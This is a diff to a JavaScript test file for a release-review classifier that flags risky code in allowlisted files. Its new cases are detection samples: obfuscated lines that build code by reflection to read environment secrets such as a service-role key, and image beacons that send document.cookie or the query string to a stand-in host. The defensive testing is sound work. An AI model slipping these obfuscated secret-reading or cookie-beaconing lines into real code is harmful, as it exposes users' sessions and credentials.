@@ -96,6 +96,16 @@ describe('Release V3 lane classifier: content (whole before and after versions)'
     ['const c = docum\\u{65}nt.cookie;', 'escape sequence'],
     ['<form action="https://evil.example/collect"><input name="e" /></form>', 'form posting to another site'],
     ['<button formAction={"//evil.example"}>Go</button>', 'form posting to another site'],
+    // Review 2, round 7: code construction, reflection, timers, beacons.
+    ["const v = [].constructor.constructor('return proc' + 'ess.env.SECRET_KEY')();", 'code construction or reflection'],
+    ["const v = (() => {}).constructor('return glob' + 'alThis.x')();", 'code construction or reflection'],
+    ["const k = global['pro' + 'cess'].env.SUPABASE_SERVICE_ROLE_KEY;", 'code construction or reflection'],
+    ["setTimeout('new Image().src=\"//e.example/?\"+docu' + 'ment.coo' + 'kie');", 'timer, worker or beacon'],
+    ["const c = Object.getOwnPropertyDescriptor(Document.prototype, 'coo' + 'kie').get.call(document);", 'code construction or reflection'],
+    ["const i = new Image(); i.src = '//e.example/' + location.search;", 'timer, worker or beacon'],
+    ["const w = new Worker('/w.js');", 'timer, worker or beacon'],
+    ["const x = obj['fe' + 'tch'];", 'assembled computed lookup'],
+    ['setInterval(tick, 1000);', 'timer, worker or beacon'],
     ["globalThis['fe' + 'tch']('/x');", 'environment or global access'],
   ])('an allowlisted file containing %j is full', (text, reason) => {
     const r = lane(change(page, text, 'A'));
@@ -112,6 +122,10 @@ describe('Release V3 lane classifier: content (whole before and after versions)'
   it('genuine type-only imports and re-exports are ignored, whatever module they name', () => {
     for (const text of [`${'\n'.repeat(3)}${' '.repeat(600)}import type { Metadata } from 'next';`, "import type { Metadata } from 'next';", "import type Stripe from 'stripe';", "export type { A, B } from '@/lib/payments/types';", "import type * as T from '@/lib/supabase/types';"])
       expect(lane(change(page, `${text}\nexport const x = 1;`, 'A')).reasons.filter(r => r.includes('imports'))).toEqual([]);
+  });
+  it('timers with an inline function and array literals stay display-only', () => {
+    for (const text of ['setTimeout(() => setOpen(false), 300);', 'const t = setTimeout(async () => { await go(); }, 50);', "setItems(prev => [...prev, { text: 'a' + b }]);"])
+      expect(lane(change(page, text, 'A'))).toMatchObject({ lane: 'standard', reasons: [] });
   });
   it('a reviewer-style alias with .. never resolves', () => {
     expect(resolveSpecifier('app/(marketing)/a.tsx', '@/components/ui/../../lib/supabase/service')).toBeNull();
